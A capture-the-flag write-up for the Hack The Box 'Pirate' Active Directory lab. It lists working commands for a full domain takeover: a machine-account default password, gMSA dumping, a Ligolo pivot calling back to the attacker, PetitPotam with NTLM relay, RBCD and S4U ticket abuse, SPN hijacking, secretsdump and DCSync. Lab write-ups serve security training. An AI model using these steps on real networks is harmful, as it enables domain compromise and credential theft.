# HTB: Pirate

| Info | Detail |
|------|--------|
| OS | Windows Server |
| Difficulty | Hard |
| IP | 10.129.5.110 |
| Domain | pirate.htb |
| Date | 2026-03-02 to 2026-03-04 |
| Type | Pure Active Directory |

## Attack Chain

```
Pre-2K Compat → Machine Account TGT (MS01$) → gMSA Password Read (gMSA_ADFS_prod$)
→ WinRM Shell → Ligolo Pivot → PetitPotam Coercion (WEB01) → NTLM Relay to DC LDAP
→ RBCD on WEB01 → S4U2Proxy → secretsdump → a.white cleartext
→ ForceChangePassword (a.white_adm) → WriteSPN on DC01$
→ KCD + SPN Hijack → DCSync → Domain Admin
```

---

## Reconnaissance

### Domain Layout

| Computer | Role | Network |
|----------|------|---------|
| DC01 | Domain Controller | External + 192.168.100.1 (dual-homed) |
| WEB01 | Web Server | 192.168.100.2 (internal only, **SMB signing disabled**) |
| MS01, ES01, EXCH01 | Member servers | Pre-created computer accounts |

### Users

| User | Notes |
|------|-------|
| a.white | ForceChangePassword on a.white_adm |
| a.white_adm | SPN set, constrained delegation, WriteSPN on DC01$ |
| j.sparrow, pentest | Standard domain users |
| gMSA_ADFS_prod$ | Group Managed Service Account |

---

## Phase 1 — Pre-Windows 2000 Compatibility Exploit

Pre-created computer accounts (`MS01$`, `ES01$`) have default password = lowercase sAMAccountName minus `$`.

```bash
getTGT.py pirate.htb/MS01$ -dc-ip <DC_IP>
# Password: ms01
```

Machine accounts have broader AD read rights than standard users.

---

## Phase 2 — gMSA Password Retrieval

`MS01$` had `msDS-AllowedToRetrieveManagedPassword` on `gMSA_ADFS_prod$`.

```bash
gMSADumper.py -u MS01$ -p ms01 -d pirate.htb
```

Retrieved NTLM hash. gMSA account had WinRM access to DC01.

> **Correction:** Use `nxc winrm -X` (PowerShell) for gMSA sessions, NOT evil-winrm (display bug). Must use `-X` not `-x`.

---

## Phase 3 — Internal Network Pivot

From WinRM on DC01, discovered dual-homed network. Deployed **Ligolo-ng v0.6.2**:

```bash
# Attacker
./proxy -selfcert

# Upload agent via base64 chunking over WinRM (74 chunks)
# DC01
./agent.exe -connect <ATTACKER>:11601 -ignore-cert

# Route
sudo ip route add 192.168.100.0/24 dev ligolo
```

> **Correction:** Ligolo v0.7.5 crashes — use v0.6.2.

---

## Phase 4 — NTLM Relay Attack

WEB01 had SMB signing disabled — relay target.

```bash
# Relay to DC LDAP with RBCD delegation
ntlmrelayx.py -t ldaps://DC01.pirate.htb --delegate-access -smb2support

# Coerce WEB01
PetitPotam.py <ATTACKER> 192.168.100.2
```

WEB01 authenticates → relayed to DC LDAP → RBCD configured on WEB01.

> **Correction:** Impacket v0.11.0 ntlmrelayx is buggy — use pip v0.12.0 with `-smb2support`.

> **Correction:** UFW blocks HTB inbound — fix: `sudo iptables -I INPUT -p tcp -s 10.129.0.0/16 -j ACCEPT`

---

## Phase 5 — RBCD Exploitation

```bash
# S4U2Self + S4U2Proxy → impersonate Administrator on WEB01
getST.py -spn cifs/WEB01.pirate.htb pirate.htb/CONTROLLEDACCOUNT$ -impersonate Administrator

# Dump secrets
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass WEB01.pirate.htb
```

Extracted cleartext password for `a.white`.

---

## Phase 6 — ForceChangePassword

BloodHound: `a.white` → **ForceChangePassword** → `a.white_adm`

```bash
net rpc password a.white_adm 'NewP@ss123!' -U pirate.htb/a.white -S DC01.pirate.htb
```

---

## Phase 7 — WriteSPN + KCD Abuse → Domain Admin

`a.white_adm` had **WriteSPN** on `DC01$`. SPN hijacking:

```bash
# Remove HTTP/WEB01 SPN from WEB01$
addspn.py -u pirate.htb/a.white_adm -t WEB01$ -r HTTP/WEB01.pirate.htb DC01.pirate.htb

# Add HTTP/WEB01 SPN to DC01$
addspn.py -u pirate.htb/a.white_adm -t DC01$ -a HTTP/WEB01.pirate.htb DC01.pirate.htb

# S4U2Proxy with -altservice → rewrite ticket for CIFS/DC01
getST.py -spn HTTP/WEB01.pirate.htb pirate.htb/a.white_adm -impersonate Administrator -altservice cifs/DC01.pirate.htb

# DCSync
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass DC01.pirate.htb
```

> **Key blocker solved:** `-altservice` returned `KRB_AP_ERR_MODIFIED` because the ticket was encrypted with WEB01$'s key but presented to DC01. Moving the SPN to DC01$ ensures the ticket is encrypted with DC01$'s key.

**User and root flags captured.**

---

## Corrections & Takeaways

| Issue | Fix |
|-------|-----|
| evil-winrm display bug with gMSA | Use `nxc winrm -X` |
| Impacket v0.11.0 ntlmrelayx broken | Use pip v0.12.0 |
| Ligolo v0.7.5 crashes | Use v0.6.2 |
| Kerberos clock skew | Use `faketime` wrapper |
| KRB_AP_ERR_MODIFIED on -altservice | WriteSPN swap fixes key mismatch |
| UFW blocking HTB traffic | iptables rule for 10.129.0.0/16 |
